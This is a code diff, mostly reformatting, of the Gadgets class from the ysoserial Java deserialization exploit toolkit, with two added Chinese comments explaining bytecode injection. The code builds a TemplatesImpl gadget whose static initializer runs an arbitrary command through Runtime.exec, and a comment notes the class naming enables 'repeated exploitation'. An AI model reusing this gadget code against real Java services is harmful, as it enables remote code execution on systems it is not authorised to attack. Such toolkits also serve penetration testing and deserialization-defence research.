@@ -29,9 +29,9 @@ import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
 /*
  * utility generator functions for common jdk-only gadgets
  */
-@SuppressWarnings ( {
+@SuppressWarnings({
     "restriction", "rawtypes", "unchecked"
-} )
+})
 public class Gadgets {
 
     static {
@@ -49,11 +49,13 @@ public class Gadgets {
         private static final long serialVersionUID = -5971610431559700674L;
 
 
-        public void transform ( DOM document, SerializationHandler[] handlers ) throws TransletException {}
+        public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
+        }
 
 
         @Override
-        public void transform ( DOM document, DTMAxisIterator iterator, SerializationHandler handler ) throws TransletException {}
+        public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
+        }
     }
 
     // required to make TemplatesImpl happy
@@ -63,35 +65,36 @@ public class Gadgets {
     }
 
 
-    public static <T> T createMemoitizedProxy ( final Map<String, Object> map, final Class<T> iface, final Class<?>... ifaces ) throws Exception {
+    public static <T> T createMemoitizedProxy(final Map<String, Object> map, final Class<T> iface,
+                                              final Class<?>... ifaces) throws Exception {
         return createProxy(createMemoizedInvocationHandler(map), iface, ifaces);
     }
 
 
-    public static InvocationHandler createMemoizedInvocationHandler ( final Map<String, Object> map ) throws Exception {
+    public static InvocationHandler createMemoizedInvocationHandler(final Map<String, Object> map) throws Exception {
         return (InvocationHandler) Reflections.getFirstCtor(ANN_INV_HANDLER_CLASS).newInstance(Override.class, map);
     }
 
 
-    public static <T> T createProxy ( final InvocationHandler ih, final Class<T> iface, final Class<?>... ifaces ) {
+    public static <T> T createProxy(final InvocationHandler ih, final Class<T> iface, final Class<?>... ifaces) {
         final Class<?>[] allIfaces = (Class<?>[]) Array.newInstance(Class.class, ifaces.length + 1);
-        allIfaces[ 0 ] = iface;
-        if ( ifaces.length > 0 ) {
+        allIfaces[0] = iface;
+        if (ifaces.length > 0) {
             System.arraycopy(ifaces, 0, allIfaces, 1, ifaces.length);
         }
         return iface.cast(Proxy.newProxyInstance(Gadgets.class.getClassLoader(), allIfaces, ih));
     }
 
 
-    public static Map<String, Object> createMap ( final String key, final Object val ) {
+    public static Map<String, Object> createMap(final String key, final Object val) {
         final Map<String, Object> map = new HashMap<String, Object>();
         map.put(key, val);
         return map;
     }
 
 
-    public static Object createTemplatesImpl ( final String command ) throws Exception {
-        if ( Boolean.parseBoolean(System.getProperty("properXalan", "false")) ) {
+    public static Object createTemplatesImpl(final String command) throws Exception {
+        if (Boolean.parseBoolean(System.getProperty("properXalan", "false"))) {
             return createTemplatesImpl(
                 command,
                 Class.forName("org.apache.xalan.xsltc.trax.TemplatesImpl"),
@@ -103,8 +106,9 @@ public class Gadgets {
     }
 
 
-    public static <T> T createTemplatesImpl ( final String command, Class<T> tplClass, Class<?> abstTranslet, Class<?> transFactory )
-            throws Exception {
+    public static <T> T createTemplatesImpl(final String command, Class<T> tplClass, Class<?> abstTranslet,
+                                            Class<?> transFactory)
+        throws Exception {
         final T templates = tplClass.newInstance();
 
         // use template gadget class
@@ -117,6 +121,8 @@ public class Gadgets {
         String cmd = "java.lang.Runtime.getRuntime().exec(\"" +
             command.replace("\\", "\\\\").replace("\"", "\\\"") +
             "\");";
+        //makeClassInitializer 	制作一个空的类初始化程序（静态构造函数）。
+        //insertAfter 静态构造函数里插入java代码
         clazz.makeClassInitializer().insertAfter(cmd);
         // sortarandom name to allow repeated exploitation (watch out for PermGen exhaustion)
         clazz.setName("ysoserial.Pwner" + System.nanoTime());
@@ -126,7 +132,7 @@ public class Gadgets {
         final byte[] classBytes = clazz.toBytecode();
 
         // inject class bytes into instance
-        Reflections.setFieldValue(templates, "_bytecodes", new byte[][] {
+        Reflections.setFieldValue(templates, "_bytecodes", new byte[][]{
             classBytes, ClassFiles.classAsBytes(Foo.class)
         });
 
@@ -137,15 +143,15 @@ public class Gadgets {
     }
 
 
-    public static HashMap makeMap ( Object v1, Object v2 ) throws Exception, ClassNotFoundException, NoSuchMethodException, InstantiationException,
-            IllegalAccessException, InvocationTargetException {
+    public static HashMap makeMap(Object v1, Object v2) throws Exception, ClassNotFoundException,
+        NoSuchMethodException, InstantiationException,
+        IllegalAccessException, InvocationTargetException {
         HashMap s = new HashMap();
         Reflections.setFieldValue(s, "size", 2);
         Class nodeC;
         try {
             nodeC = Class.forName("java.util.HashMap$Node");
-        }
-        catch ( ClassNotFoundException e ) {
+        } catch (ClassNotFoundException e) {
             nodeC = Class.forName("java.util.HashMap$Entry");
         }
         Constructor nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);
